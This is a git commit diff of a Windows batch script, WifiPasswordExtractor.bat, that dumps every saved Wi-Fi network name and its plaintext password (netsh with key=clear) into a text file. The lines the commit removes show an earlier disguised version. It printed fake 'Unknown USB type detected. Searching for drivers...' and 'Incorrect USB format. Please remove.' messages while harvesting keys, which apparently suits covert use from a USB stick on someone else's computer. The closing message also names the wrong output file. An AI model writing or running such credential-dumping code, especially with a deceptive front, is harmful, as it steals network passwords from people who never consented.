948f728c1cb612245dd82b91d4568b8d4ee96236
zacharykeeton <zachary.keeton@gmail.com>
2015-08-13 11:32:18 -0500

    Condensed code

--- WifiPasswordExtractor.bat
+++ WifiPasswordExtractor.bat
@@ -1,17 +1,17 @@
 @echo off
-rem "a stripped down version of the wlan key dumper written by: Aditya K Sood  (adi_ks [at] secniche.org)."
 
-echo Unknown USB type detected. Searching for drivers...
+echo Working...
 
-netsh wlan show profiles * | findstr /l :"SSID name" > %TMP%\ssids.txt
-del %TMP%\ssidswkeys.txt > nul 2> nul
+del ssidswkeys.txt 2> nul
 
-for /F "tokens=4*" %%i in (%TMP%\ssids.txt) do (
-	echo ssid: %%i %%j >> %TMP%\ssidswkeys.txt 
-	netsh wlan show profile name=%%i %%j key=clear | findstr /l :"Key Content"   >> %TMP%\ssidswkeys.txt 
-        echo( >> %TMP%\ssidswkeys.txt 
+for /F "tokens=4*" %%i in ('netsh wlan show profiles *^| findstr /l :"SSID name"') do ( 
+	
+	echo ssid: %%i %%j >> ssidswkeys.txt 
+	netsh wlan show profile name=%%i %%j key=clear | findstr /l :"Key Content" >> ssidswkeys.txt
+	echo( >> ssidswkeys.txt
+ 
 )
-del %TMP%\ssids.txt
 
-echo Incorrect USB format. Please remove.
+echo Finished. See 'ssidskeys.txt'
+
 pause
